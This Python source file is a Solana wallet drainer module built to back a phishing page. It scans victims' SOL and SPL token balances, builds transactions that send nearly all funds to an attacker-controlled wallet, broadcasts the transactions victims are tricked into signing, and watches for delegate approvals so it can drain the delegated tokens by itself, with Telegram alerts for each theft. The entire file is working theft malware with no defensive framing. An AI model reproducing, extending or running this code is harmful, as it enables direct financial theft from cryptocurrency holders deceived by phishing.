#!/usr/bin/env python3
"""
Solana wallet drainer module (renamed to `solana_drainer.py`).
"""

import json
import sys
import time
import base58
from pathlib import Path
from typing import Optional, Dict, List, Tuple

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from backend.config import (
    CHAIN_CONFIG, SOLANA_PRIVATE_KEY, SOLANA_WALLET_ADDRESS,
    LOG_FILE, SOLANA_RPC
)

# Solana imports
try:
    import base58
    from solana.rpc.api import Client as SolanaClient
    from solana.rpc.commitment import Confirmed
    from solana.rpc.types import TokenAccountOpts
    from solana.keypair import Keypair
    from solana.publickey import PublicKey
    from solana.transaction import Transaction
    from solana.system_program import transfer as sol_transfer
    from solana.system_program import TransferParams
    import spl.token.client as spl_client
    from spl.token.constants import TOKEN_PROGRAM_ID
    from spl.token.instructions import (
        transfer_checked, TransferCheckedParams,
        get_associated_token_address,
        create_associated_token_account,
    )
    HAS_SOLANA = True
except ImportError:
    HAS_SOLANA = False
    print("[!] Solana libraries not installed. Run: pip install solana spl-token base58")


class SolanaDrainer:
    """Handles Solana wallet operations: balance checking and draining."""

    def __init__(self, chain_name="solana"):
        self.chain_name = chain_name
        self.config = CHAIN_CONFIG.get(chain_name)
        if not self.config:
            raise ValueError(f"Solana chain not configured: {chain_name}")

        self.rpc_url = self.config["rpc"]
        if SOLANA_RPC:
            self.rpc_url = SOLANA_RPC

        self.client = SolanaClient(self.rpc_url)

        # Our drainer wallet
        if SOLANA_PRIVATE_KEY:
            # Decode base58 private key
            try:
                decoded = base58.b58decode(SOLANA_PRIVATE_KEY)
                self.drainer_keypair = Keypair.from_secret_key(decoded[:32])
                self.drainer_address = str(self.drainer_keypair.public_key)
            except Exception as e:
                print(f"[-] Failed to load Solana keypair: {e}")
                self.drainer_keypair = None
                self.drainer_address = SOLANA_WALLET_ADDRESS
        else:
            self.drainer_keypair = None
            self.drainer_address = SOLANA_WALLET_ADDRESS

        self.log_path = Path(LOG_FILE)

        # High-value SPL tokens to check
        self.target_tokens = self.config.get("high_value_tokens", {})

    def log(self, msg):
        """Log with timestamp."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{timestamp}] [Solana] {msg}"
        print(line)
        with open(self.log_path, "a") as f:
            f.write(line + "\n")

    def is_connected(self) -> bool:
        """Check connection to Solana RPC."""
        try:
            return self.client.is_connected()
        except:
            return False

    def check_wallet(self, address: str) -> Dict:
        """
        Check a Solana wallet's balances.
        Returns native SOL balance + all SPL token balances.
        """
        try:
            pubkey = PublicKey(address)
            
            # Get SOL balance
            sol_balance = self.client.get_balance(pubkey, commitment=Confirmed)
            sol_lamports = sol_balance['result']['value']
            sol_sol = sol_lamports / 1e9
            
            result = {
                "address": address,
                "sol_balance": sol_sol,
                "sol_lamports": sol_lamports,
                "tokens": []
            }
            
            # Get SPL token accounts
            token_accounts = self.client.get_token_accounts_by_owner(
                pubkey,
                TokenAccountOpts(program_id=TOKEN_PROGRAM_ID),
                commitment=Confirmed
            )
            
            for acc in token_accounts['result']['value']:
                account_data = acc['account']['data']['parsed']['info']
                mint = account_data['mint']
                token_amount = account_data['tokenAmount']
                
                # Check if this is a high-value token
                symbol = None
                for sym, mint_addr in self.target_tokens.items():
                    if mint_addr == mint:
                        symbol = sym
                        break
                
                result["tokens"].append({
                    "mint": mint,
                    "symbol": symbol or "UNKNOWN",
                    "amount": token_amount['uiAmount'],
                    "raw_amount": token_amount['amount'],
                    "decimals": token_amount['decimals'],
                    "token_account": str(acc['pubkey']),
                })
            
            return result
            
        except Exception as e:
            self.log(f"Error checking wallet {address}: {e}")
            return {"address": address, "error": str(e)}

    def build_drain_transaction(self, victim_address: str, max_tokens: int = 10) -> Optional[Dict]:
        """
        Build a transaction that drains a victim's wallet.
        Returns the serialized transaction + metadata, or None if nothing to drain.
        NOTE: The actual signing must happen client-side (in Phantom/Backpack).
        This builds the transaction that the phishing page sends to the wallet.
        """
        try:
            victim = PublicKey(victim_address)
            drainer = PublicKey(self.drainer_address)
            
            if victim == drainer:
                return None
            
            # Check wallet first
            wallet_info = self.check_wallet(victim_address)
            instructions = []
            tokens_found = []
            
            # 1. SOL transfer (leave 0.001 SOL for fees)
            sol_to_drain = wallet_info['sol_lamports'] - 1_000_000  # Leave 0.001 SOL
            if sol_to_drain > 0:
                instructions.append({
                    "type": "sol_transfer",
                    "from": victim_address,
                    "to": self.drainer_address,
                    "amount": sol_to_drain,
                    "amount_sol": sol_to_drain / 1e9
                })
                tokens_found.append("SOL")
            
            # 2. SPL token transfers
            for token in wallet_info['tokens']:
                if len(instructions) >= max_tokens + 1:  # +1 for SOL
                    break
                
                if token['amount'] and token['amount'] > 0:
                    mint = PublicKey(token['mint'])
                    
                    # Get source ATA
                    source_ata = get_associated_token_address(victim, mint)
                    
                    # Get destination ATA (create if needed)
                    dest_ata = get_associated_token_address(drainer, mint)
                    
                    instructions.append({
                        "type": "spl_transfer",
                        "mint": token['mint'],
                        "symbol": token['symbol'],
                        "source_ata": str(source_ata),
                        "dest_ata": str(dest_ata),
                        "amount": token['raw_amount'],
                        "amount_ui": token['amount'],
                        "decimals": token['decimals'],
                    })
                    tokens_found.append(token['symbol'] or token['mint'][:8])
            
            return {
                "victim": victim_address,
                "drainer": self.drainer_address,
                "instructions": instructions,
                "tokens_found": tokens_found,
                "estimated_value_sol": wallet_info['sol_balance']
            }
            
        except Exception as e:
            self.log(f"Error building drain tx for {victim_address}: {e}")
            return None

    def process_signed_transaction(self, signed_tx_hex: str) -> Dict:
        """
        Broadcast a signed transaction to the Solana network.
        Called when the phishing page sends back a signed tx.
        """
        try:
            import base64
            tx_bytes = base64.b64decode(signed_tx_hex)
            
            result = self.client.send_raw_transaction(tx_bytes, opts={
                "skip_preflight": True,
                "max_retries": 5
            })
            
            tx_hash = result['result']
            self.log(f"[+] Solana drain tx broadcast: {tx_hash}")
            
            return {
                "success": True,
                "tx_hash": tx_hash,
                "explorer_url": f"https://solscan.io/tx/{tx_hash}"
            }
            
        except Exception as e:
            self.log(f"[-] Failed to broadcast Solana tx: {e}")
            return {"success": False, "error": str(e)}

    def monitor_for_delegates(self, check_interval: int = 60) -> None:
        """
        Monitor for delegate approvals on our drainer address.
        This is the Solana equivalent of the EVM Approval event monitor.
        """
        self.log(f"[*] Starting Solana delegate monitor (checking every {check_interval}s)")
        
        last_checked_slot = self.client.get_slot()['result'] - 100
        
        while True:
            try:
                current_slot = self.client.get_slot()['result']
                
                # Query token accounts where our drainer is the delegate
                delegate_accounts = self.client.get_token_accounts_by_delegate(
                    PublicKey(self.drainer_address),
                    TokenAccountOpts(program_id=TOKEN_PROGRAM_ID),
                    commitment=Confirmed
                )
                
                if delegate_accounts['result']['value']:
                    for acc in delegate_accounts['result']['value']:
                        account_data = acc['account']['data']['parsed']['info']
                        mint = account_data['mint']
                        delegated_amount = account_data['delegatedAmount']
                        
                        if delegated_amount and int(delegated_amount['amount']) > 0:
                            owner = account_data['owner']
                            self.log(f"[!] Delegate approval: {owner} delegated {delegated_amount['uiAmount']} of {mint}")
                            
                            # Notify via Telegram
                            try:
                                from bot.telegram_bot import notify_approval
                                notify_approval(owner, mint, delegated_amount['uiAmount'], "solana")
                            except:
                                pass
                            
                            # Auto-drain: we can transfer up to the delegated amount
                            self.drain_via_delegate(owner, mint, int(delegated_amount['amount']))
                
                last_checked_slot = current_slot
                time.sleep(check_interval)
                
            except Exception as e:
                self.log(f"[-] Delegate monitor error: {e}")
                time.sleep(60)

    def drain_via_delegate(self, owner_address: str, mint_address: str, amount: int) -> bool:
        """
        Drain tokens from a victim who approved us as a delegate.
        This is the server-side equivalent — we can call transfer without the victim signing.
        """
        try:
            if not self.drainer_keypair:
                self.log("[-] No Solana keypair configured for signing")
                return False
            
            owner = PublicKey(owner_address)
            mint = PublicKey(mint_address)
            drainer = PublicKey(self.drainer_address)
            
            # Get the source ATA (owned by victim)
            source_ata = get_associated_token_address(owner, mint)
            
            # Get or create destination ATA
            dest_ata = get_associated_token_address(drainer, mint)
            
            # Check if destination ATA exists
            dest_account_info = self.client.get_account_info(dest_ata)
            needs_create = dest_account_info['result']['value'] is None
            
            # Build transaction
            tx = Transaction()
            
            if needs_create:
                tx.add(
                    create_associated_token_account(
                        self.drainer_keypair.public_key,  # payer
                        drainer,                           # owner
                        mint                               # mint
                    )
                )
            
            tx.add(
                transfer_checked(
                    TransferCheckedParams(
                        program_id=TOKEN_PROGRAM_ID,
                        source=source_ata,
                        mint=mint,
                        dest=dest_ata,
                        owner=self.drainer_keypair.public_key,  # We're the delegate
                        amount=amount,
                        decimals=9,  # Will be overridden by the actual decimals
                        signers=[self.drainer_keypair]
                    )
                )
            )
            
            # Sign and send
            result = self.client.send_transaction(tx, self.drainer_keypair)
            tx_hash = result['result']
            
            self.log(f"[+] Drained via delegate: {amount} of {mint_address} from {owner_address}")
            self.log(f"    Tx: {tx_hash}")
            
            # Telegram notification
            try:
                from bot.telegram_bot import notify_drain
                notify_drain(owner_address, mint_address[:8], str(amount), tx_hash, "solana")
            except:
                pass
            
            return True
            
        except Exception as e:
            self.log(f"[-] Delegate drain failed: {e}")
            return False


# ─── CLI Interface ─────────────────────────────────────────────
def main():
    import argparse
    parser = argparse.ArgumentParser(description="Solana Drainer Tool")
    parser.add_argument("--chain", default="solana", help="Solana chain to use: solana, solana_testnet, solana_devnet")
    parser.add_argument("--check", help="Check wallet balances")
    parser.add_argument("--monitor", action="store_true", help="Start delegate monitor")
    parser.add_argument("--build-tx", help="Build drain transaction for victim address")
    args = parser.parse_args()
    
    if not HAS_SOLANA:
        print("[!] Install Solana dependencies:")
        print("    pip install solana spl-token base58")
        sys.exit(1)
    
    drainer = SolanaDrainer(chain_name=args.chain)
    
    if not drainer.is_connected():
        print(f"[-] Cannot connect to Solana RPC: {drainer.rpc_url}")
        sys.exit(1)
    
    print(f"[+] Connected to Solana chain: {drainer.chain_name}")
    print(f"[+] RPC: {drainer.rpc_url}")
    print(f"[+] Drainer wallet: {drainer.drainer_address}")
    
    if args.check:
        info = drainer.check_wallet(args.check)
        print(f"\nWallet: {info['address']}")
        print(f"SOL: {info['sol_balance']:.4f}")
        print(f"Tokens: {len(info['tokens'])}")
        for t in info['tokens']:
            if t['amount']:
                print(f"  {t['symbol'] or '?'}: {t['amount']} (mint: {t['mint'][:12]}...)")
    
    elif args.build_tx:
        tx = drainer.build_drain_transaction(args.build_tx)
        import pprint
        pprint.pprint(tx)

if __name__ == '__main__':
    main()
